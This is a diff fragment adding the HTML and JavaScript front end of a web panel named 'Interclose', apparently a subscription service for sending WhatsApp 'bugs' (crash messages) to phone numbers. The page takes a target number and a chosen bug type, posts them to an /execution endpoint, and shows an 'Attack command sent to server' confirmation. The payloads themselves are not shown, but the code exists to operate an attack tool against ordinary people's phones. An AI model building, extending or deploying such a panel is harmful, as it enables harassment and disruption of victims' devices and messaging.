+            </li>
+            
+            <li class="sidebar-item hidden" id="admin-menu-item">
+                <a href="/user-management" class="sidebar-link">
+                    <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                    Admin menu
+                </a>
+            </li>
+            
+            <li class="sidebar-item">
+                <a href="/my-support" class="sidebar-link">
+                    <svg xmlns="http://www.w3.org/2000/svg" height="25px" viewBox="0 -960 960 960" width="25px" fill="currentColor"><path d="M61.85-425.31q-20.31-36.77-31.08-74.73T20-576q0-102.77 70.62-173.38Q161.23-820 264-820q61.85 0 118.27 29 56.42 29 97.73 82.16Q521.31-762 577.73-791T696-820q102.77 0 173.38 70.62Q940-678.77 940-576q0 37.23-10.77 74.81-10.77 37.57-31.08 75.5-8.69-13.62-20.42-24.39-11.73-10.76-26.35-17.46 14-28.38 21.31-55.19Q880-549.54 880-576q0-77.62-53.19-130.81T696-760q-71.38 0-118.35 40.85Q530.69-678.31 480-616q-50.69-62.92-97.65-103.46Q335.38-760 264-760q-77.62 0-130.81 53.19T80-576q0 27.23 7.31 54.23 7.31 27 20.92 54.62-14.61 7.07-26.15 17.65-11.54 10.58-20.23 24.19ZM20-99.23V-148q0-40.54 41.81-65.88 41.81-25.35 108.58-25.35 12.23 0 23.46.69t21.46 2.69q-11.31 17.7-17.16 37.62-5.84 19.92-5.84 42.46v56.54H20Zm240 0v-55q0-57.31 60.92-91.92 60.93-34.62 159.08-34.62 99.15 0 159.58 34.62Q700-211.54 700-154.23v55H260Zm507.69 0v-56.54q0-22.54-5.34-42.46-5.35-19.92-16.04-37.62 10.23-2 21.15-2.69 10.92-.69 22.54-.69 67.38 0 108.69 25.35Q940-188.54 940-148v48.77H767.69Zm-597.3-178.85q-28.39 0-48.43-20.03-20.04-20.04-20.04-48.43 0-28.61 20.04-48.34 20.04-19.73 48.43-19.73 28.61 0 48.53 19.73 19.93 19.73 19.93 48.34 0 28.39-19.93 48.43-19.92 20.03-48.53 20.03Zm619.61 0q-28 0-48.23-20.03-20.23-20.04-20.23-48.43 0-28.61 20.23-48.34Q762-414.61 790-414.61q29 0 48.73 19.73 19.73 19.73 19.73 48.34 0 28.39-19.73 48.43Q819-278.08 790-278.08Zm-310-32.69q-43.08 0-73.46-30.38-30.38-30.39-30.38-73.46 0-44.08 30.38-73.96 30.38-29.89 73.46-29.89 44.08 0 73.96 29.89 29.88 29.88 29.88 73.96 0 43.07-29.88 73.46-29.88 30.38-73.96 30.38Z"/></svg>
+                    Support
+                </a>
+            </li>
+
+            <li class="menu-separator"></li>
+
+            <div class="sidebar-credits">
+                <div class="credits-title">Development Team</div>
+                <div class="credit-item">
+                    <span>@Shin_ss3</span> - Dev Shin
+                </div>
+                <div class="credit-item">
+                    <span>@tokatsu_1</span> - My Chanel
+                </div>
+            </div>
+        </ul>
+
+        <div class="sidebar-footer">
+            <button class="logout-btn" id="logoutBtn">
+                <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
+                LOGOUT SYSTEM
+            </button>
+        </div>
+    </aside>
+
+    <div class="modal-overlay" id="successModal">
+        <div class="success-card">
+            <div class="success-icon-container">
+                <i class="fa-solid fa-check"></i>
+            </div>
+            <h3 class="success-title">SYSTEM SUCCESS</h3>
+            <p class="success-subtitle">Attack command sent to server</p>
+            
+            <div class="success-details">
+                <div class="detail-row">
+                    <span class="detail-label">Target:</span>
+                    <span class="detail-value" id="modalTarget">-</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Method:</span>
+                    <span class="detail-value" id="modalBug">-</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Status:</span>
+                    <span class="detail-value" style="color: var(--accent-green);">EXECUTING</span>
+                </div>
+            </div>
+
+            <button class="close-modal-btn" id="closeModalBtn">CONFIRM</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <header>
+            <div class="header-left">
+                <svg id="menuBtn" class="menu-btn" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="3" y1="6" x2="21" y2="6"></line>
+                    <line x1="3" y1="12" x2="15" y2="12"></line> 
+                    <line x1="3" y1="18" x2="18" y2="18"></line>
+                </svg>
+                <h1 class="brand-title">Interclose</h1>
+            </div>
+        </header>
+
+        <!-- MAIN CONTENT -->
+        <main>
+            <div class="user-card">
+                <div class="user-card-content">
+                    <div class="profile-photo">
+                        <img src="https://files.catbox.moe/5m8xpw.jpg" alt="Profile">
+                    </div>
+                    <div class="user-info-middle">
+                        <div class="username" id="exec-username">${username || "Loading..."}</div>
+                        <div class="role-box">
+                            <span class="role-label">Role</span>
+                            <span class="role-value" id="exec-role">${role ? role.toUpperCase() : "LOADING"}</span>
+                        </div>
+                    </div>
+                    <div class="expiry-box">
+                        <div class="expiry-label">Expires</div>
+                        <div class="expiry-date" id="exec-expired">${expiredDate}</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- BANNER -->
+            <div class="banner">
+                <img src="https://files.catbox.moe/7e4m5f.jpg">
+                <div class="banner-text">
+                    <h2>Inter close</h2>
+                </div>
+            </div>
+
+            ${showForm ? `
+            <!-- FORM SECTION -->
+            <div class="form-section">
+                <div class="input-group">
+                    <div class="input-header">
+                        <h3>Number Targets</h3>
+                    </div>
+                    <div class="input-body">
+                        <i class="fa-solid fa-mobile-screen"></i>
+                        <input type="text" placeholder="e.g. +62xxxxxxxxxx" class="custom-input" id="targetInput" value="${target || ''}">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <div class="input-header">
+                        <h3>Pilih Bug</h3>
+                    </div>
+                    <div class="input-body">
+                        <i class="fa-solid fa-biohazard"></i>
+                        <div class="custom-dropdown" id="bugDropdown">
+                            <div class="dropdown-selected empty" id="dropdownSelected">
+                                <span>Select Type</span>
+                                <div class="dropdown-icon">
+                                    <i class="fa-solid fa-caret-down"></i>
+                                </div>
+                            </div>
+                            
+                            <div class="dropdown-options" id="dropdownOptions">
+                                <!-- Dropdown options akan diisi oleh JavaScript -->
+                            </div>
+                        </div>
+                        <input type="hidden" id="bugValue" value="${mode || ''}">
+                    </div>
+                </div>
+
+                <!-- Button -->
+                <button class="send-btn" id="sendBtn" ${target && mode ? '' : 'disabled'}>
+                    <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#FFFFFF"><path d="M120-160v-240l320-80-320-80v-240l760 320-760 320Z"/></svg>
+                    SEND BUG
+                </button>
+            </div>
+            ` : `
+            <div style="text-align: center; padding: 30px;">
+                <h3 style="color: var(--accent-green); margin-bottom: 15px;">✅ EXECUTION SUCCESS</h3>
+                <p style="color: var(--text-gray); margin-bottom: 20px;">${data.message || "Bug berhasil dikirim"}</p>
+                <a href="/execution" style="display: inline-block; padding: 10px 20px; background: var(--accent-pink); color: white; text-decoration: none; border-radius: 8px;">Kembali ke Execution</a>
+            </div>
+            `}
+        </main>
+
+        <nav class="bottom-nav">
+            <button class="nav-item" id="navDashboard">
+                <svg width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"></path></svg>
+                <span class="nav-text">Home</span>
+            </button>
+            <button class="nav-item active" id="navWhatsApp">
+                <svg width="22" height="22" viewBox="0 -960 960 960" fill="currentColor" transform="matrix(-1,0,0,1,0,0)">
+                    <path d="M240-400h480v-80H240v80Zm0-120h480v-80H240v80Zm0-120h480v-80H240v80ZM880-80 720-240H160q-33 0-56.5-23.5T80-320v-480q0-33 23.5-56.5T160-880h640q33 0 56.5 23.5T880-800v720ZM160-320h594l46 45v-525H160v480Zm0 0v-480 480Z"></path>
+                </svg>
+                <span class="nav-text">WhatsApp</span>
+            </button>
+            <button class="nav-item" id="navAnime">
+                <svg width="22" height="22" viewBox="0 -960 960 960" fill="currentColor">
+                    <path d="m160-800 80 160h120l-80-160h80l80 160h120l-80-160h80l80 160h120l-80-160h120q33 0 56.5 23.5T880-720v480q0 33-23.5 56.5T800-160H160q-33 0-56.5-23.5T80-240v-480q0-33 23.5-56.5T160-800Zm0 240v320h640v-320H160Zm0 0v320-320Z"/>
+                    <path d="M380-320 l-25-60 -60-25 60-25 25-60 25 60 60 25 -60 25 -25 60Z"/>
+                    <path d="M580-480 l-15-35 -35-15 35-15 15-35 15 35 35 15 -35 15 -15 35Z"/>
+                </svg>
+                <span class="nav-text">Anime</span>
+            </button>
+        </nav>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', async () => {
+            const menuBtn = document.getElementById('menuBtn');
+            const sidebar = document.getElementById('sidebar');
+            const overlay = document.getElementById('sidebarOverlay');
+            const sendBtn = document.getElementById('sendBtn');
+            const targetInput = document.getElementById('targetInput');
+            
+            // Modal Elements
+            const successModal = document.getElementById('successModal');
+            const closeModalBtn = document.getElementById('closeModalBtn');
+            const modalTarget = document.getElementById('modalTarget');
+            const modalBug = document.getElementById('modalBug');
+
+            // Dropdown Elements
+            const dropdownSelected = document.getElementById('dropdownSelected');
+            const dropdownOptions = document.getElementById('dropdownOptions');
+            const dropdownIcon = document.querySelector('.dropdown-icon');
+            const bugValueInput = document.getElementById('bugValue');
+            
+            // Logout Button
+            const logoutBtn = document.getElementById('logoutBtn');
+
+            async function fetchUserData() {
+                try {
+                    const response = await fetch('/api/option-data');
+                    if (!response.ok) {
+                        throw new Error('Failed to fetch user data');
+                    }
+                    const userData = await response.json();
+                    
+                    console.log('User data fetched in execution:', userData);
+                    
+                    // Update sidebar
+                    const sidebarUsername = document.getElementById('sidebar-username');
+                    const sidebarRole = document.getElementById('sidebar-role');
+                    
+                    if (sidebarUsername) sidebarUsername.textContent = userData.username || 'Guest';
+                    if (sidebarRole) sidebarRole.textContent = \`Role: \${userData.role ? userData.role.toUpperCase() : 'USER'}\`;
+                    
+                    // Update user card di halaman execution
+                    const execUsername = document.getElementById('exec-username');
+                    const execRole = document.getElementById('exec-role');
+                    const execExpired = document.getElementById('exec-expired');
+                    
+                    if (execUsername) execUsername.textContent = userData.username || 'Guest';
+                    if (execRole) execRole.textContent = userData.role ? userData.role.toUpperCase() : 'USER';
+                    if (execExpired) {
+                        if (userData.expired === 'Permanent' || userData.daysRemaining === 99999) {
+                            execExpired.textContent = 'Permanent';
+                            execExpired.style.color = '#10b981';
+                        } else {
+                            execExpired.textContent = userData.expired || 'Unknown';
+                            execExpired.style.color = '#eab308';
+                        }
+                    }
+                    
+                    const adminMenuItem = document.getElementById('admin-menu-item');
+                    if (adminMenuItem) {
+                        if (userData.role === 'owner' || userData.role === 'admin') {
+                            adminMenuItem.classList.remove('hidden');
+                        } else {
+                            adminMenuItem.classList.add('hidden');
+                        }
+                    }
+                    
+                    return userData;
+                } catch (error) {
+                    console.error('Error fetching user data:', error);
+                    document.getElementById('sidebar-username').textContent = 'Error';
+                    document.getElementById('sidebar-role').textContent = 'Role: ERROR';
+                    document.getElementById('exec-username').textContent = 'Error';
+                    document.getElementById('exec-role').textContent = 'ERROR';
+                    document.getElementById('exec-expired').textContent = 'Error loading';
+                    
+                    const adminMenuItem = document.getElementById('admin-menu-item');
+                    if (adminMenuItem) {
+                        adminMenuItem.classList.add('hidden');
+                    }
+                    
+                    return null;
+                }
+            }
+
+            // Load user data on page load
+            await fetchUserData();
+            
+            async function loadBugOptions() {
+                try {
+                    const response = await fetch('/api/bug-options');
+                    const options = await response.json();
+                    
+                    dropdownOptions.innerHTML = '';
+                    options.forEach(option => {
+                        const optionElement = document.createElement('div');
+                        optionElement.className = 'dropdown-option';
+                        optionElement.setAttribute('data-value', option.value);
+                        optionElement.innerHTML = \`
+                            <span class="option-icon"><i class="\${option.icon || 'fa-solid fa-bug'}"></i></span>
+                            <span>\${option.name}</span>
+                        \`;
+                        dropdownOptions.appendChild(optionElement);
+                    });
+                    
+                    const dropdownOptionsList = document.querySelectorAll('.dropdown-option');
+                    dropdownOptionsList.forEach(option => {
+                        option.addEventListener('click', () => {
+                            const text = option.querySelectorAll('span')[1].textContent;
+                            
+                            dropdownSelected.querySelector('span').textContent = text;
+                            dropdownSelected.classList.remove('empty');
+                            
+                            // Update hidden value
+                            bugValueInput.value = option.getAttribute('data-value');
+                            
+                            // Visual Selection
+                            dropdownOptionsList.forEach(opt => opt.classList.remove('selected'));
+                            option.classList.add('selected');
+                            
+                            // Close dropdown
+                            dropdownOptions.classList.remove('active');
+                            dropdownIcon.classList.remove('active');
+                            
+                            validateForm();
+                        });
+                    });
+                    
+                    if (bugValueInput.value) {
+                        const selectedOption = Array.from(dropdownOptionsList).find(opt => opt.getAttribute('data-value') === bugValueInput.value);
+                        if (selectedOption) {
+                            const text = selectedOption.querySelectorAll('span')[1].textContent;
+                            dropdownSelected.querySelector('span').textContent = text;
+                            dropdownSelected.classList.remove('empty');
+                            selectedOption.classList.add('selected');
+                        }
+                    }
+                } catch (error) {
+                    console.error('Error loading bug options:', error);
+                }
+            }
+
+            // Load bug options
+            loadBugOptions();
+
+            // Toggle Sidebar
+            function toggleSidebar() {
+                sidebar.classList.toggle('active');
+                overlay.classList.toggle('active');
+            }
+            menuBtn.addEventListener('click', toggleSidebar);
+            overlay.addEventListener('click', toggleSidebar);
+
+            // Navbar Navigation
+            document.getElementById('navDashboard').addEventListener('click', () => {
+                window.location.href = '/dashboard';
+            });
+
+            document.getElementById('navWhatsApp').addEventListener('click', () => {
+                window.location.href = '/execution';
+            });
+
+            document.getElementById('navAnime').addEventListener('click', () => {
+                window.location.href = '/anime';
+            });
+
+            // Logout Button
+            logoutBtn.addEventListener('click', () => {
+                if (confirm('Are you sure you want to logout?')) {
+                    window.location.href = '/logout';
+                }
+            });
+
+            // --- DROPDOWN LOGIC ---
+            dropdownSelected.addEventListener('click', (e) => {
+                e.stopPropagation();
+                dropdownOptions.classList.toggle('active');
+                dropdownIcon.classList.toggle('active');
+            });
+
+            document.addEventListener('click', (e) => {
+                if (!e.target.closest('.custom-dropdown')) {
+                    dropdownOptions.classList.remove('active');
+                    dropdownIcon.classList.remove('active');
+                }
+            });
+
+            // --- FORM LOGIC ---
+            function validateForm() {
+                const isTargetFilled = targetInput.value.trim() !== '';
+                const isBugSelected = bugValueInput.value !== '';
+                sendBtn.disabled = !(isTargetFilled && isBugSelected);
+            }
+
+            targetInput.addEventListener('input', validateForm);
+
+            // --- SEND BUTTON & MODAL ---
+            sendBtn.addEventListener('click', async () => {
+                if(sendBtn.disabled) return;
+
+                const originalContent = sendBtn.innerHTML;
+                const bugText = dropdownSelected.querySelector('span').textContent;
+                const targetValue = targetInput.value.trim();
+                
+                // Loading State
+                sendBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> PROCESSING...';
+                sendBtn.disabled = true;
+
+                try {
+                    const response = await fetch('/execution', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: new URLSearchParams({
+                            target: targetValue,
+                            mode: bugValueInput.value
+                        })
+                    });
+
+                    const result = await response.json();
+                    
+                    if (result.success) {
+                        modalTarget.textContent = targetValue;
+                        modalBug.textContent = bugText;
+
+                        successModal.classList.add('active');
+                    } else {
+                        alert(\`Error: \${result.error || 'Failed to execute bug'}\`);
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('Failed to send bug request');
+                } finally {
+                    sendBtn.innerHTML = originalContent;
+                    sendBtn.disabled = false;
+                }
+            });
+
+            // Close Modal Logic
+            closeModalBtn.addEventListener('click', () => {
+                successModal.classList.remove('active');
+                targetInput.value = '';
+                dropdownSelected.querySelector('span').textContent = 'Select Type';
+                dropdownSelected.classList.add('empty');
+                bugValueInput.value = '';
+                document.querySelectorAll('.dropdown-option').forEach(opt => opt.classList.remove('selected'));
+                validateForm();
+            });
+            
+            setInterval(async () => {
+                await fetchUserData();
+            }, 30000);
+        });
+    </script>
+</body>
+</html>`;
+};
